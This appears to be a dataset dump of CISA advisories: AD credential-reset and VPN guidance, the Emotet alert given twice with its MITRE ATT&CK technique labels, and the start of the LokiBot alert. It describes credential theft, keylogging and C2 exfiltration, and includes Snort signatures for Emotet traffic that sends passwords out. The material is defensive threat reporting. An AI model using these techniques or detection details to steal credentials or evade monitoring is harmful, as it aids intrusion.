CISA Alert TA15-314A – Compromised Web Servers and Web Shells – Threat Awareness and Guidance.
National Security Agency Cybersecurity Information Sheet U/OO/134094-20 – Detect and Prevent Web Shells Malware.


Isolate external facing services in a network demilitarized zone (DMZ) since they are more exposed to malicious activity; enable robust logging, and monitor the logs for signs of compromise.
Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.
Implement application controls to only allow execution from specified application directories. System administrators may implement this through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and WINDOWS folders. All other locations should be disallowed unless an exception is granted.
Block Remote Desktop Protocol (RDP) connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.

Comprehensive Account Resets
For accounts where NTLM password hashes or Kerberos tickets may have been compromised (e.g., through CVE-2020-1472), a double-password-reset may be required in order to prevent continued exploitation of those accounts. For domain-admin-level credentials, a reset of KRB-TGT “Golden Tickets” may be required, and Microsoft has released specialized guidance for this. Such a reset should be performed very carefully if needed.
If there is an observation of CVE-2020-1472 Netlogon activity or other indications of valid credential abuse, it should be assumed the APT actors have compromised AD administrative accounts. In such cases, the AD forest should not be fully trusted, and, therefore, a new forest should be deployed. Existing hosts from the old compromised forest cannot be migrated in without being rebuilt and rejoined to the new domain, but migration may be done through “creative destruction,” wherein, as endpoints in the legacy forest are decommissioned, new ones can be built in the new forest. This will need to be completed in on-premise—as well as in Azure-hosted—AD instances.
Note that fully resetting an AD forest is difficult and complex; it is best done with the assistance of personnel who have successfully completed the task previously.
It is critical to perform a full password reset on all user and computer accounts in the AD forest. Use the following steps as a guide.

Create a temporary administrator account, and use this account only for all administrative actions
Reset the Kerberos Ticket Granting Ticket (krbtgt) password;,1, this must be completed before any additional actions (a second reset will take place in step 5)
Wait for the krbtgt reset to propagate to all domain controllers (time may vary)
 Reset all account passwords (passwords should be 15 characters or more and randomly assigned):

User accounts (forced reset with no legacy password reuse)
Local accounts on hosts (including local accounts not covered by Local Administrator Password Solution,LAPS,)
Service accounts
Directory Services Restore Mode (DSRM) account
Domain Controller machine account
Application passwords


Reset the krbtgt password again
Wait for the krbtgt reset to propagate to all domain controllers (time may vary)
Reboot domain controllers
Reboot all endpoints

The following accounts should be reset:

AD Kerberos Authentication Master (2x)
All Active Directory Accounts
All Active Directory Admin Accounts
All Active Directory Service Accounts
All Active Directory User Accounts
DSRM Account on Domain Controllers
Non-AD Privileged Application Accounts
Non-AD Unprivileged Application Accounts
Non-Windows Privileged Accounts
Non-Windows User Accounts
Windows Computer Accounts
Windows Local Admin

VPN Vulnerabilities
Implement the following recommendations to secure your organization’s VPNs:

Update VPNs, network infrastructure devices, and devices being used to remote into work environments with the latest software patches and security configurations. See CISA Tips Understanding Patches and Software Updates and Securing Network Infrastructure Devices. Wherever possible, enable automatic updates.
Implement MFA on all VPN connections to increase security. Physical security tokens are the most secure form of MFA, followed by authenticator app-based MFA. SMS and email-based MFA should only be used when no other forms are available. If MFA is not implemented, require teleworkers to use strong passwords. See CISA Tips Choosing and Protecting Passwords and Supplementing Passwords for more information.

Discontinue unused VPN servers. Reduce your organization’s attack surface by discontinuing unused VPN servers, which may act as a point of entry for attackers. To protect your organization against VPN vulnerabilities:

Audit configuration and patch management programs.
Monitor network traffic for unexpected and unapproved protocols, especially outbound to the Internet (e.g., Secure Shell,SSH, SMB, RDP).
Implement MFA, especially for privileged accounts.
Use separate administrative accounts on separate administration workstations.
Keep software up to date. Enable automatic updates, if available.


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
Resources

APT Actors Chaining Vulnerabilities Against SLTT, Critical Infrastructure, and Elections Organizations – https://us-cert.cisa.gov/ncas/alerts/aa20-283a
CISA Activity Alert CVE-2019-19781 – https://us-cert/cisa.gov/ncas/alerts/aa20-031a
CISA Vulnerability Bulletin – https://us-cert/cisa.gov/ncas/bulletins/SB19-161
CISA Current Activity – https://us-cert.cisa.gov/ncas/current-activity/2020/03/10/unpatched-microsoft-exchange-servers-vulnerable-cve-2020-0688
Citrix Directory Traversal Bug (CVE-2019-19781) – https://nvd.nist.gov/vuln/detail/CVE-2019-19781
Microsoft Exchange remote code execution flaw (CVE-2020-0688) – https://nvd.nist.gov/vuln/detail/CVE-2020-0688
CVE-2018-13379 – https://nvd.nist.gov/vuln/detail/CVE-2018-13379
CVE-2020-1472 – https://nvd.nist.gov/vuln/detail/CVE-2020-1472
CVE 2019-10149 – https://nvd.nist.gov/vuln/detail/CVE-2019-10149
NCCIC/USCERT Alert TA15-314A – Compromised Web Servers and Web Shells – Threat Awareness and Guidance – https://us-cert.cisa.gov/ncas/alerts/TA15-314A
NCCIC/US-CERT publication on SMB Security Best Practices – https://us-cert.cisa.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices
	 

 
DISCLAIMER
 

This information is provided ""as is"" for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information. In no event shall the United States Government or its contractors or subcontractors be liable for any damages, including but not limited to, direct, indirect, special or consequential damages, arising out of, resulting from, or in any way connected with this information, whether or not based upon warranty, contract, tort, or otherwise, whether or not arising out of negligence, and whether or not injury was sustained from, or arose out of the results of, or reliance upon the information.
The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.


References,1, Microsoft: AD Forest Recovery - Resetting the krbtgt password

Revisions

October 22, 2020: Initial Version|November 17, 2020: Added U.S. Heat Map of Activity|December 1, 2020: Added ""current as of"" date to U.S. Heat Map of Activity






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-296a
73,"




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor techniques.
This product was written by the Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC).
Emotet—a sophisticated Trojan commonly functioning as a downloader or dropper of other malware—resurged in July 2020, after a dormant period that began in February. Since August, CISA and MS-ISAC have seen a significant increase in malicious cyber actors targeting state and local governments with Emotet phishing emails. This increase has rendered Emotet one of the most prevalent ongoing threats.
To secure against Emotet, CISA and MS-ISAC recommend implementing the mitigation measures described in this Alert, which include applying protocols that block suspicious attachments, using antivirus software, and blocking suspicious IPs.

Technical Details

Emotet is an advanced Trojan primarily spread via phishing email attachments and links that, once clicked, launch the payload (Phishing: Spearphishing Attachment [T1566.001], Phishing: Spearphishing Link [T1566.002]).The malware then attempts to proliferate within a network by brute forcing user credentials and writing to shared drives (Brute Force: Password Guessing [T1110.001], Valid Accounts: Local Accounts [T1078.003], Remote Services: SMB/Windows Admin Shares [T1021.002]).
Emotet is difficult to combat because of its “worm-like” features that enable network-wide infections. Additionally, Emotet uses modular Dynamic Link Libraries to continuously evolve and update its capabilities.
Since July 2020, CISA has seen increased activity involving Emotet-associated indicators. During that time, CISA’s EINSTEIN Intrusion Detection System, which protects federal, civilian executive branch networks, has detected roughly 16,000 alerts related to Emotet activity. CISA observed Emotet being executed in phases during possible targeted campaigns. Emotet used compromised Word documents (.doc) attached to phishing emails as initial insertion vectors. Possible command and control network traffic involved HTTP POST requests to Uniform Resource Identifiers consisting of nonsensical random length alphabetical directories to known Emotet-related domains or IPs with the following user agent string (Application Layer Protocol: Web Protocols [T1071.001]).
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; .NET CLR
Traffic to known Emotet-related domains or IPs occurred most commonly over ports 80, 8080, and 443. In one instance, traffic from an Emotet-related IP attempted to connect to a suspected compromised site over port 445, possibly indicating the use of Server Message Block exploitation frameworks along with Emotet (Exploitation of Remote Services [T1210]). Figure 1 lays out Emotet’s use of enterprise techniques.
 
​
Figure 1: MITRE ATT&CK enterprise techniques used by Emotet
 
Timeline of Activity
The following timeline identifies key Emotet activity observed in 2020.

February: Cybercriminals targeted non-U.S. countries using COVID-19-themed phishing emails to lure victims to download Emotet.[1]


July: Researchers spotted emails with previously used Emotet URLs, particularly those used in the February campaign, targeting U.S. businesses with COVID-19-themed lures.[2]


August:

Security researchers observed a 1,000 percent increase in downloads of the Emotet loader. Following this change, antivirus software firms adjusted their detection heuristics to compensate, leading to decreases in observed loader downloads.[3]  
Proofpoint researchers noted mostly minimal changes in most tactics and tools previously used with Emotet. Significant changes included:

Emotet delivering Qbot affiliate partner01 as the primary payload and
The Emotet mail sending module’s ability to deliver benign and malicious attachments.[4]


CISA and MS-ISAC observed increased attacks in the United States, particularly cyber actors using Emotet to target state and local governments.




September:

Cyber agencies and researchers alerted the public of surges of Emotet, including compromises in Canada, France, Japan, New Zealand, Italy, and the Netherlands. Emotet botnets were observed dropping Trickbot to deliver ransomware payloads against some victims and Qakbot Trojans to steal banking credentials and data from other targets.[5],[6],[7],[8]
Security researchers from Microsoft identified a pivot in tactics from the Emotet campaign. The new tactics include attaching password-protected archive files (e.g., Zip files) to emails to bypass email security gateways. These email messages purport to deliver documents created on mobile devices to lure targeted users into enabling macros to “view” the documents—an action which actually enables the delivery of malware.[9]
Palo Alto Networks reported cyber actors using thread hijacking to spread Emotet. This attack technique involves stealing an existing email chain from an infected host to reply to the chain—using a spoofed identity—and attaching a malicious document to trick recipients into opening the file.[10]



MITRE ATT&CK Techniques
According to MITRE, Emotet uses the ATT&CK techniques listed in table 1.
Table 1: Common exploit tools




Technique

Use





OS Credential Dumping: LSASS Memory [T1003.001]


Emotet has been observed dropping password grabber modules including Mimikatz.




Remote Services: SMB/Windows Admin Shares [T1021.002]


Emotet leverages the Admin$ share for lateral movement once the local admin password has been brute forced.




Obfuscated Files or Information [T1027]


Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware, cmd.exe arguments, and PowerShell scripts.




Obfuscated Files or Information: Software Packing [T1027.002]


Emotet has used custom packers to protect its payloads.




Network Sniffing [T1040]


Emotet has been observed to hook network APIs to monitor network traffic.




Exfiltration Over C2 Channel [T1041]


Emotet has been seen exfiltrating system information stored within cookies sent within a HTTP GET request back to its command and control (C2) servers.




Windows Management Instrumentation [T1047]


Emotet has used WMI to execute powershell.exe.




Process Injection: Dynamic-link Library Injection [T1055.001]


Emotet has been observed injecting in to Explorer.exe and other processes.




Process Discovery [T1057]


Emotet has been observed enumerating local processes.




Command and Scripting Interpreter: PowerShell [T1059.001]


Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz.




Command and Scripting Interpreter: Windows Command Shell [T1059.003]


Emotet has used cmd.exe to run a PowerShell script.




Command and Scripting Interpreter: Visual Basic [T1059.005]


Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.




Valid Accounts: Local Accounts [T1078.003]


Emotet can brute force a local admin password, then use it to facilitate lateral movement.




Account Discovery: Email Account [T1087.003]


Emotet has been observed leveraging a module that can scrape email addresses from Outlook.




Brute Force: Password Guessing [T1110.001]


Emotet has been observed using a hard-coded list of passwords to brute force user accounts.




Email Collection: Local Email Collection [T1114.001]


Emotet has been observed leveraging a module that scrapes email data from Outlook.




User Execution: Malicious Link [T1204.001]


Emotet has relied upon users clicking on a malicious link delivered through spearphishing.




User Execution: Malicious File [T1204.002]


Emotet has relied upon users clicking on a malicious attachment delivered through spearphishing.




Exploitation of Remote Services [T1210]


Emotet has been seen exploiting SMB via a vulnerability exploit like ETERNALBLUE (MS17-010) to achieve lateral movement and propagation.




Create or Modify System Process: Windows Service [T1543.003]


Emotet has been observed creating new services to maintain persistence.




Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]


Emotet has been observed adding the downloaded payload to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key to maintain persistence.




Scheduled Task/Job: Scheduled Task [T1053.005]


Emotet has maintained persistence through a scheduled task.




Unsecured Credentials: Credentials In Files [T1552.001]


Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user.




Credentials from Password Stores: Credentials from Web Browsers [T1555.003]


Emotet has been observed dropping browser password grabber modules.




Archive Collected Data [T1560]


Emotet has been observed encrypting the data it collects before sending it to the C2 server.




Phishing: Spearphishing Attachment [T1566.001]


Emotet has been delivered by phishing emails containing attachments.




Phishing: Spearphishing Link [T1566.002]


Emotet has been delivered by phishing emails containing links.




Non-Standard Port [T1571]


Emotet has used HTTP over ports such as 20, 22, 7080, and 50000, in addition to using ports commonly associated with HTTP/Hypertext Transfer Protocol Secure.




Encrypted Channel: Asymmetric Cryptography [T1573.002]


Emotet is known to use RSA keys for encrypting C2 traffic.




Detection
Signatures
MS-ISAC developed the following Snort signature for use in detecting network activity associated with Emotet activity.
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""[CIS] Emotet C2 Traffic Using Form Data to Send Passwords""; content:""POST""; http_method; content:""Content-Type|3a 20|multipart/form-data|3b 20|boundary=""; http_header; fast_pattern; content:""Content-Disposition|3a 20|form-data|3b 20|name=|22|""; http_client_body; content:!""------WebKitFormBoundary""; http_client_body; content:!""Cookie|3a|""; pcre:""/:?(chrome|firefox|safari|opera|ie|edge) passwords/i""; reference:url,cofense.com/flash-bulletin-emotet-epoch-1-changes-c2-communication/; sid:1; rev:2;)
CISA developed the following Snort signatures for use in detecting network activity associated with Emotet activity. Note: Uniform Resource Identifiers should contain a random length alphabetical multiple directory string, and activity will likely be over ports 80, 8080, or 443.
alert tcp any any -> any $HTTP_PORTS (msg:""EMOTET:HTTP URI GET contains '/wp-content/###/'""; sid:00000000; rev:1; flow:established,to_server; content:""/wp-content/""; http_uri; content:""/""; http_uri; distance:0; within:4; content:""GET""; nocase; http_method; urilen:<17; classtype:http-uri; content:""Connection|3a 20|Keep-Alive|0d 0a|""; http_header; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""EMOTET:HTTP URI GET contains '/wp-admin/###/'""; sid:00000000; rev:1; flow:established,to_server; content:""/wp-admin/""; http_uri; content:""/""; http_uri; distance:0; within:4; content:""GET""; nocase; http_method; urilen:<15; content:""Connection|3a 20|Keep-Alive|0d 0a|""; http_header; classtype:http-uri; metadata:service http;)

Mitigations

CISA and MS-ISAC recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid unwanted impacts.

Block email attachments commonly associated with malware (e.g.,.dll and .exe).
Block email attachments that cannot be scanned by antivirus software (e.g., .zip files).
Implement Group Policy Object and firewall rules.
Implement an antivirus program and a formalized patch management process.
Implement filters at the email gateway, and block suspicious IP addresses at the firewall.
Adhere to the principle of least privilege.
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system.
Segment and segregate networks and functions.
Limit unnecessary lateral communications.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Enforce multi-factor authentication.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to suspicious or risky sites.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.
See CISA’s Alert on Technical Approaches to Uncovering and Remediating Malicious Activity for more information on addressing potential incidents and applying best practice incident response procedures.
See the joint CISA and MS-ISAC Ransomware Guide on how to be proactive and prevent ransomware attacks from happening and for a detailed approach on how to respond to an attack and best resolve the cyber incident.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources

MS-ISAC Security Event Primer – Emotet
CISA Alert TA18-201A – Emotet Malware
MITRE ATT&CK – Emotet
MITRE ATT&CK for Enterprise


References

[1] Bleeping Computer: Emotet Malware Strikes U.S. Businesses with COVID-19 Spam
[2] IBID
[3] Security Lab: Emotet Update Increases Downloads
[4] Proofpoint: A Comprehensive Look at Emotet’s Summer 2020 Return
[5] ZDNet: France, Japan, New Zealand Warn of Sudden Strike in Emotet Attacks
[6] Bleeping Computer: France Warns of Emotet Attacking Companies, Administration
[7] ESET: Emotet Strikes Quebec’s Department of Justice: An ESET Analysis
[8] ZDNet: Microsoft, Italy, and the Netherlands Warn of Increased Emotet Activity
[9] Bleeping Computer: Emotet Double Blunder: Fake ‘Windows 10 Mobile’ and Outdated Messages
[10] Palo Alto Networks: Case Study: Emotet Thread Hijacking, an Email Attack Technique

Revisions

October 6, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1573.002', 'T1566.002', 'T1021.002', 'T1087.003', 'T1571', 'T1560', 'T1040', 'T1204.002', 'T1210', 'T1114.001', 'T1003.001', 'T1055.001', 'T1204.001', 'T1027', 'T1078.003', 'T1543.003', 'T1552.001', 'T1059.005', 'T1057', 'T1566.001', 'T1059.001', 'T1027.002', 'T1547.001', 'T1110.001', 'T1071.001', 'T1047', 'T1053.005', 'T1059.003', 'T1555.003'}","




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor techniques.
This product was written by the Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC).
Emotet—a sophisticated Trojan commonly functioning as a downloader or dropper of other malware—resurged in July 2020, after a dormant period that began in February. Since August, CISA and MS-ISAC have seen a significant increase in malicious cyber actors targeting state and local governments with Emotet phishing emails. This increase has rendered Emotet one of the most prevalent ongoing threats.
To secure against Emotet, CISA and MS-ISAC recommend implementing the mitigation measures described in this Alert, which include applying protocols that block suspicious attachments, using antivirus software, and blocking suspicious IPs.

Technical Details

Emotet is an advanced Trojan primarily spread via phishing email attachments and links that, once clicked, launch the payload (Phishing: Spearphishing Attachment, Phishing: Spearphishing Link,).The malware then attempts to proliferate within a network by brute forcing user credentials and writing to shared drives (Brute Force: Password Guessing, Valid Accounts: Local Accounts, Remote Services: SMB/Windows Admin Shares,).
Emotet is difficult to combat because of its “worm-like” features that enable network-wide infections. Additionally, Emotet uses modular Dynamic Link Libraries to continuously evolve and update its capabilities.
Since July 2020, CISA has seen increased activity involving Emotet-associated indicators. During that time, CISA’s EINSTEIN Intrusion Detection System, which protects federal, civilian executive branch networks, has detected roughly 16,000 alerts related to Emotet activity. CISA observed Emotet being executed in phases during possible targeted campaigns. Emotet used compromised Word documents (.doc) attached to phishing emails as initial insertion vectors. Possible command and control network traffic involved HTTP POST requests to Uniform Resource Identifiers consisting of nonsensical random length alphabetical directories to known Emotet-related domains or IPs with the following user agent string (Application Layer Protocol: Web Protocols,).
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; .NET CLR
Traffic to known Emotet-related domains or IPs occurred most commonly over ports 80, 8080, and 443. In one instance, traffic from an Emotet-related IP attempted to connect to a suspected compromised site over port 445, possibly indicating the use of Server Message Block exploitation frameworks along with Emotet (Exploitation of Remote Services,). Figure 1 lays out Emotet’s use of enterprise techniques.
 
​
Figure 1: MITRE ATT&CK enterprise techniques used by Emotet
 
Timeline of Activity
The following timeline identifies key Emotet activity observed in 2020.

February: Cybercriminals targeted non-U.S. countries using COVID-19-themed phishing emails to lure victims to download Emotet.,1,


July: Researchers spotted emails with previously used Emotet URLs, particularly those used in the February campaign, targeting U.S. businesses with COVID-19-themed lures.,2,


August:

Security researchers observed a 1,000 percent increase in downloads of the Emotet loader. Following this change, antivirus software firms adjusted their detection heuristics to compensate, leading to decreases in observed loader downloads.,3,  
Proofpoint researchers noted mostly minimal changes in most tactics and tools previously used with Emotet. Significant changes included:

Emotet delivering Qbot affiliate partner01 as the primary payload and
The Emotet mail sending module’s ability to deliver benign and malicious attachments.,4,


CISA and MS-ISAC observed increased attacks in the United States, particularly cyber actors using Emotet to target state and local governments.




September:

Cyber agencies and researchers alerted the public of surges of Emotet, including compromises in Canada, France, Japan, New Zealand, Italy, and the Netherlands. Emotet botnets were observed dropping Trickbot to deliver ransomware payloads against some victims and Qakbot Trojans to steal banking credentials and data from other targets.,5,6,7,8,
Security researchers from Microsoft identified a pivot in tactics from the Emotet campaign. The new tactics include attaching password-protected archive files (e.g., Zip files) to emails to bypass email security gateways. These email messages purport to deliver documents created on mobile devices to lure targeted users into enabling macros to “view” the documents—an action which actually enables the delivery of malware.,9,
Palo Alto Networks reported cyber actors using thread hijacking to spread Emotet. This attack technique involves stealing an existing email chain from an infected host to reply to the chain—using a spoofed identity—and attaching a malicious document to trick recipients into opening the file.,10,



MITRE ATT&CK Techniques
According to MITRE, Emotet uses the ATT&CK techniques listed in table 1.
Table 1: Common exploit tools

Detection
Signatures
MS-ISAC developed the following Snort signature for use in detecting network activity associated with Emotet activity.
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"",CIS, Emotet C2 Traffic Using Form Data to Send Passwords""; content:""POST""; http_method; content:""Content-Type|3a 20|multipart/form-data|3b 20|boundary=""; http_header; fast_pattern; content:""Content-Disposition|3a 20|form-data|3b 20|name=|22|""; http_client_body; content:!""------WebKitFormBoundary""; http_client_body; content:!""Cookie|3a|""; pcre:""/:?(chrome|firefox|safari|opera|ie|edge) passwords/i""; reference:url,cofense.com/flash-bulletin-emotet-epoch-1-changes-c2-communication/; sid:1; rev:2;)
CISA developed the following Snort signatures for use in detecting network activity associated with Emotet activity. Note: Uniform Resource Identifiers should contain a random length alphabetical multiple directory string, and activity will likely be over ports 80, 8080, or 443.
alert tcp any any -> any $HTTP_PORTS (msg:""EMOTET:HTTP URI GET contains '/wp-content/###/'""; sid:00000000; rev:1; flow:established,to_server; content:""/wp-content/""; http_uri; content:""/""; http_uri; distance:0; within:4; content:""GET""; nocase; http_method; urilen:<17; classtype:http-uri; content:""Connection|3a 20|Keep-Alive|0d 0a|""; http_header; metadata:service http;)
alert tcp any any -> any $HTTP_PORTS (msg:""EMOTET:HTTP URI GET contains '/wp-admin/###/'""; sid:00000000; rev:1; flow:established,to_server; content:""/wp-admin/""; http_uri; content:""/""; http_uri; distance:0; within:4; content:""GET""; nocase; http_method; urilen:<15; content:""Connection|3a 20|Keep-Alive|0d 0a|""; http_header; classtype:http-uri; metadata:service http;)

Mitigations

CISA and MS-ISAC recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid unwanted impacts.

Block email attachments commonly associated with malware (e.g.,.dll and .exe).
Block email attachments that cannot be scanned by antivirus software (e.g..zip files).
Implement Group Policy Object and firewall rules.
Implement an antivirus program and a formalized patch management process.
Implement filters at the email gateway, and block suspicious IP addresses at the firewall.
Adhere to the principle of least privilege.
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system.
Segment and segregate networks and functions.
Limit unnecessary lateral communications.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Enforce multi-factor authentication.
Exercise caution when opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Enable a firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure the scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to suspicious or risky sites.
Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs).
Scan all software downloaded from the internet prior to executing.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.
See CISA’s Alert on Technical Approaches to Uncovering and Remediating Malicious Activity for more information on addressing potential incidents and applying best practice incident response procedures.
See the joint CISA and MS-ISAC Ransomware Guide on how to be proactive and prevent ransomware attacks from happening and for a detailed approach on how to respond to an attack and best resolve the cyber incident.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources

MS-ISAC Security Event Primer – Emotet
CISA Alert TA18-201A – Emotet Malware
MITRE ATT&CK – Emotet
MITRE ATT&CK for Enterprise


References,1, Bleeping Computer: Emotet Malware Strikes U.S. Businesses with COVID-19 Spam,2, IBID,3, Security Lab: Emotet Update Increases Downloads,4, Proofpoint: A Comprehensive Look at Emotet’s Summer 2020 Return,5, ZDNet: France, Japan, New Zealand Warn of Sudden Strike in Emotet Attacks,6, Bleeping Computer: France Warns of Emotet Attacking Companies, Administration,7, ESET: Emotet Strikes Quebec’s Department of Justice: An ESET Analysis,8, ZDNet: Microsoft, Italy, and the Netherlands Warn of Increased Emotet Activity,9, Bleeping Computer: Emotet Double Blunder: Fake ‘Windows 10 Mobile’ and Outdated Messages,10, Palo Alto Networks: Case Study: Emotet Thread Hijacking, an Email Attack Technique

Revisions

October 6, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a
74,"




Summary

This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise frameworks for all referenced threat actor techniques.
This product was written by the Cybersecurity and Infrastructure Security Agency (CISA) with contributions by the Multi-State Information Sharing & Analysis Center (MS-ISAC).
CISA has observed a notable increase in the use of LokiBot malware by malicious cyber actors since July 2020. Throughout this period, CISA’s EINSTEIN Intrusion Detection System, which protects federal, civilian executive branch networks, has detected persistent malicious LokiBot activity. LokiBot uses a credential- and information-stealing malware, often sent as a malicious attachment and known for being simple, yet effective, making it an attractive tool for a broad range of cyber actors across a wide variety of data compromise use cases.

Technical Details

LokiBot—also known as Lokibot, Loki PWS, and Loki-bot—employs Trojan malware to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials.

The malware steals credentials through the use of a keylogger to monitor browser and desktop activity (Credentials from Password Stores [T1555]).

(Credentials from Password Stores: Credentials from Web Browsers [T1555.003])
(Input Capture: Keylogging [T1056.001])


LokiBot can also create a backdoor into infected systems to allow an attacker to install additional payloads (Event Triggered Execution: Accessibility Features [T1546.008]).
Malicious cyber actors typically use LokiBot to target Windows and Android operating systems and distribute the malware via email, malicious websites, text, and other private messages (User Execution: Malicious File [T1204.002]). See figure 1 for enterprise techniques used by LokiBot.

​
Figure 1: MITRE ATT&CK enterprise techniques used by LokiBot
Since LokiBot was first reported in 2015, cyber actors have used it across a range of targeted applications, including the following.

February 2020: Trend Micro identified cyber actors using LokiBot to impersonate a launcher for Fortnite—a popular video game.[1]
August 2019: FortiGuard SE researchers discovered a malspam campaign distributing LokiBot information-stealing payloads in spearphishing attack on a U.S. manufacturing company.[2]
August 2019: Trend Micro researchers reported LokiBot malware source code being hidden in image files spread as attachments in phishing emails.[3]
June 2019: Netskope uncovered LokiBot being distributed in a malspam campaign using ISO image file attachments.[4]
April 2019: Netskope uncovered a phishing campaign using malicious email attachments with LokiBot malware to create backdoors onto infected Windows systems and steal sensitive information.[5]
February 2018: Trend Micro discovered CVE-2017-11882 being exploited in an attack using Windows Installer service to deliver LokiBot malware.[6]
October 2017: SfyLabs identified cyber actors using LokiBot as an Android banking trojan that turns into ransomware.[7]
May 2017: Fortinet reported malicious actors using a PDF file to spread a new LokiBot variant capable of stealing credentials from more than 100 different software tools.[8]
March 2017: Check Point discovered LokiBot malware found pre-installed on Android devices.[9]
December 2016: Dr.Web researchers identified a new LokiBot variant targeting Android core libraries.[10]
February 2016: Researchers discovered the LokiBot Android Trojan infecting the core Android operating system processes.[11]

MITRE ATT&CK Techniques
According to MITRE, LokiBot uses the ATT&CK techniques listed in table 1.
Table 1: LokiBot ATT&CK techniques 




Technique


Use






System Network Configuration Discovery [T1016]


LokiBot has the ability to discover the domain name of the infected host.




Obfuscated Files or Information [T1027]


LokiBot has obfuscated strings with base64 encoding.




Obfuscated Files or Information: Software Packing [T1027.002]


LokiBot has used several packing methods for obfuscation.




System Owner/User Discovery [T1033]


LokiBot has the ability to discover the username on the infected host.




Exfiltration Over C2 Channel [T1041]


LokiBot has the ability to initiate contact with command and control to exfiltrate stolen data.




Process Injection: Process Hollowing [T1055.012]


LokiBot has used process hollowing to inject into legitimate Windows process vbc.exe.




Input Capture: Keylogging [T1056.001]


LokiBot has the ability to capture input on the compromised host via keylogging.




Application Layer Protocol: Web Protocols [T1071.001]


LokiBot has used Hypertext Transfer Protocol for command and control.




System Information Discovery [T1082]


LokiBot has the ability to discover the computer name and Windows product name/version.




User Execution: Malicious File [T1204.002]


LokiBot has been executed through malicious documents contained in spearphishing emails.




Credentials from Password Stores [T1555]


LokiBot has stolen credentials from multiple applications and data sources including Windows operating system credentials, email clients, File Transfer Protocol, and Secure File Transfer Protocol clients.




